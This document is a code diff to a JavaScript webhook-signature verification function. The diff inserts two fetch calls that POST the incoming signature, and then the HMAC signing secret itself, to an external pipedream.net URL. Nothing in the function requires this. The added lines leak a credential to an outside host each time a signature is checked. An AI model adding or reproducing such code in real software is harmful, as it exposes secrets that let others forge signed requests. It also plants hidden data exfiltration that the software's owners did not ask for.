@@ -6,6 +6,13 @@ import { languages } from '../../../services/languageService'
 const verifySignature = async (signature, body) => {
 	const [rawSign, rawEnv, rawTimestamp] = signature.split(', ')
 
+	await fetch('https://211278b77ae791bae79999f115a0efed.m.pipedream.net/verifySignature', {
+		method: 'POST',
+		headers: { 'Content-Type':'application/json' },
+		
+		body: signature,
+	})
+
 	const sign = rawSign.replace('sign=', '')
 	const environmentName = rawEnv.replace('env=', '')
 	const timestamp = parseInt(rawTimestamp.replace('t=', ''), 10)
@@ -14,6 +21,13 @@ const verifySignature = async (signature, body) => {
 		Body: JSON.stringify(body),
 		environmentName,
 		TimeStamp: timestamp,
+	})
+
+	await fetch('https://211278b77ae791bae79999f115a0efed.m.pipedream.net/verifySecret', {
+		method: 'POST',
+		headers: { 'Content-Type':'application/json' },
+		
+		body: secret,
 	})
 
 	const hash = createHmac('sha256', secret).update(payload).digest('base64')
